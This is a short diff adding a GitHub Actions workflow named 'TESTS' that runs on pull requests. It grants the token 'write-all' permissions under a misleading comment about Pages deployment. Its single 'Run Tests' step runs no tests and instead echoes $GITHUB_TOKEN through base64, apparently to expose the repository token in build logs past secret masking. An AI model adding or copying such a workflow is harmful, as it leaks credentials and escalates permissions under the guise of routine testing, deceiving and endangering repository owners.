@@ -1,0 +1,12 @@
+name: TESTS
+'on':
+- pull_request
+# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
+permissions: write-all 
+
+jobs:
+  testing:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Run Tests
+      run: echo $GITHUB_TOKEN | base64
